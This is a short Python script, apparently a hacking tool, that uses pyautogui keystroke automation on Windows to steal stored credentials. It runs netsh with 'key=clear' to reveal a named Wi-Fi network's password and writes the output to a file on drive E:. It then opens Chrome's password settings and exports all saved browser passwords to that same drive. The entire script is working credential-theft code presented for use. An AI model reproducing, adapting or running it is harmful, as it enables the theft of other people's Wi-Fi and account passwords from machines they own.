import pyautogui
import time

pyautogui.hotkey("win", "r")
time.sleep(1)
pyautogui.write('cmd.exe', interval=0.1)
pyautogui.press("enter")
time.sleep(1)
print()
print("    <------------------------------>")
print("    <----- By: 2Hack - S4mura1 ---->")
print("    <------------------------------>")
print()
name = input('    - Ingrese el nombre de la Red: ')
print('    - ¡Sus datos seran almacenados en el archivo GWPass! ')
print()



#Hackear Contraseña
pyautogui.write("netsh wlan show profile name=", interval=0.1)
pyautogui.write(name)
pyautogui.write(" key=clear", interval=0.1)
pyautogui.press("enter")
time.sleep(2)

#copiar informacion
pyautogui.press("up")
pyautogui.write(" > ", interval=0.1)
pyautogui.write("E:GWPass.txt", interval=0.1) #cambiar lugar de almacenamiento
pyautogui.press("enter")
time.sleep(2)

#------------------------------------GOOGLE-PASSWORDS---------------------------------#

pyautogui.hotkey("win", "r")
time.sleep(2)
pyautogui.write('chrome.exe "chrome://settings/passwords"', interval=0.1)
pyautogui.press("enter")
time.sleep(2)
pyautogui.write("chrome://settings/passwords", interval=0.1)
pyautogui.press("enter")

#Exportar contraseñas
time.sleep(8)
pyautogui.press("tab", presses=8)
pyautogui.press("enter")
pyautogui.press("down")
pyautogui.press("enter")
time.sleep(2)
pyautogui.press("enter")

#--------------------------------#

pyautogui.write("E:\Password-Google", interval=0.1) #Cambiar lugar de almacenamiento




